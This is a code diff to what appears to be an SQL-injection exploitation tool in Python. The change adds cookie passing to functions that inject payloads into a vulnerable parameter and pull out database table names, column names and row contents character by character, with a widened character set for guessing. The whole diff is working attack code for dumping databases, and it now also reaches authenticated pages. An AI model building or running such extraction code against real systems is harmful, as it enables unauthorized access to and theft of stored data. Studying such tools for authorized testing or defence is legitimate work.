@@ -8,9 +8,9 @@ from colorama import Fore
 from urlQuery import sendReq
 
 # Extract Binary Search algorithm (BiSection)
-def boolenTF(url, params, d):
+def boolenTF(url, params, d, cookies=None):
     start = time.time()
-    r = sendReq(url, data=params, allow_redirects=False) if d else sendReq(url, params=params, allow_redirects=False)
+    r = sendReq(url, data=params, cookies=cookies, allow_redirects=False) if d else sendReq(url, params=params, cookies=cookies, allow_redirects=False)
     end = time.time()
     t = end - start
     if r.status_code == 200 and r.status_code != 500:
@@ -30,14 +30,14 @@ def prepPayload(params, vulnPoint, payloads, row, extract, pos, x, tblName=None,
     newParams[vulnPoint] += injPayload
     return newParams
 
-def extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract, tblName=None, clmName=None, max_length=100):
+def extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract, tblName=None, clmName=None, cookies=None, max_length=100):
     x = ''
     pos = 1
     while True:
         found = False
-        for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "!\"£$%^&*()_+=-][\{\}/.,<>?]":
+        for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "!\"£$%^&*()_+=-][\{\}/.,<>?]@'#~":
             newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, ord(char), tblName=tblName, clmName=clmName)
-            if boolenTF(url, newParams, d):
+            if boolenTF(url, newParams, d, cookies=cookies):
                 x += char
                 sys.stdout.write(Fore.GREEN + f"\r[+] Result: {x}" + Fore.RESET)
                 pos += 1
@@ -48,11 +48,11 @@ def extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract, tblName=N
             break
     return x
 
-def extractTables(url, params, vulnPoint, payloads, d):
+def extractTables(url, params, vulnPoint, payloads, d, cookies=None):
     row = 0
     tblNames = []
     while True:
-        tempTbl = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='tbls')
+        tempTbl = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='tbls', cookies=cookies)
         if tempTbl:
             print ()
             tblNames.append(tempTbl)
@@ -61,13 +61,15 @@ def extractTables(url, params, vulnPoint, payloads, d):
             break
     return tblNames
 
-def extractColumns(url, params, vulnPoint, payloads, d, tblNames):
+def extractColumns(url, params, vulnPoint, payloads, d, tblNames, cookies=None):
+    if tblNames:
+        print (Fore.YELLOW + f"Tables: {tblNames}" + Fore.RESET)
     clmNames = {}
     for tblName in tblNames:
         clmNames[tblName] = []
         row = 0
         while True:
-            tempClm = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='clms', tblName=tblName)
+            tempClm = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='clms', tblName=tblName, cookies=cookies)
             if tempClm:
                 print ()
                 clmNames[tblName].append(tempClm)
@@ -76,7 +78,9 @@ def extractColumns(url, params, vulnPoint, payloads, d, tblNames):
                 break
     return clmNames
     
-def extractInfo(url, params, vulnPoint, payloads, d, tblNames, clmNames):
+def extractInfo(url, params, vulnPoint, payloads, d, tblNames, clmNames, cookies=None):
+    if clmNames:
+        print (Fore.YELLOW + f"Columns: {clmNames}" + Fore.RESET)
     info = {}
     for tblName in tblNames:
         row = 0
@@ -85,7 +89,7 @@ def extractInfo(url, params, vulnPoint, payloads, d, tblNames, clmNames):
             tempDict = {}
             for clmName in clmNames[tblName]:
                 print ()
-                tempInfo = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='info', tblName=tblName, clmName=clmName)
+                tempInfo = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='info', tblName=tblName, clmName=clmName, cookies=cookies)
                 tempDict[clmName] = tempInfo
             if not any(tempDict.values()):
                 break
@@ -93,11 +97,11 @@ def extractInfo(url, params, vulnPoint, payloads, d, tblNames, clmNames):
             row += 1
     return info              
 
-def extractTimeMain(url, params, vulnPoint, payloads, d, tbl=None, clm=None):
+def extractTimeMain(url, params, vulnPoint, payloads, d, tbl=None, clm=None, cookies=None):
     info = {}
-    tblNames = [tbl] if tbl is not None else extractTables(url, params, vulnPoint, payloads[0], d)
-    clmNames = {tbl: clm} if clm is not None else extractColumns(url, params, vulnPoint, payloads[1], d, tblNames)
-    info.update(extractInfo(url, params, vulnPoint, payloads[2], d, tblNames, clmNames))
+    tblNames = [tbl] if tbl is not None else extractTables(url, params, vulnPoint, payloads[0], d, cookies=cookies)
+    clmNames = {tbl: clm} if clm is not None else extractColumns(url, params, vulnPoint, payloads[1], d, tblNames, cookies=cookies)
+    info.update(extractInfo(url, params, vulnPoint, payloads[2], d, tblNames, clmNames, cookies=cookies))
     
     if tbl is None and clm is None and info:
         return True, info
